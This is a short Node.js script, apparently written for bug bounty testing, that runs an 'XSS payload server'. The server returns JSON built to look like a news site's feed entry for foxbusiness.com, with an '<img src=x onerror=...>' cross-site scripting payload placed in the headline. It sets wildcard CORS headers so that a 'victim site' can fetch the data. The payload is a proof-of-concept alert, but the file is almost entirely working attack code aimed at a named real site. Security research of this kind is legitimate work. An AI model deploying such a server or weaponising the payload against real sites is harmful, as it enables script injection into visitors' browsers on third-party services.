/**
 * XSS payload server - serves JSON with permissive CORS for bug bounty testing.
 * Use with ngrok, or deploy to Vercel/Render/Railway/Replit for a public HTTPS URL.
 */

const http = require('http');

const PORT = process.env.PORT || 3000;

const payload = {
  data: {
    results: [{
      publication_date: '2026-03-03T12:00:00Z',
      'main-content': [{
        component: 'BreakingNews',
        model: {
          url: 'https://www.foxbusiness.com/markets',
          headline: 'SECURITY TEST <img src=x onerror=alert(document.domain)>',
          bannerType: 'BreakingNews'
        }
      }]
    }]
  }
};

const server = http.createServer((req, res) => {
  // CORS: allow any origin so the victim site can read the response
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Content-Type', 'application/json');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  res.writeHead(200);
  res.end(JSON.stringify(payload, null, 2));
});

server.listen(PORT, () => {
  console.log(`XSS payload server on http://localhost:${PORT}`);
  console.log('Payload URL: / (root)');
});
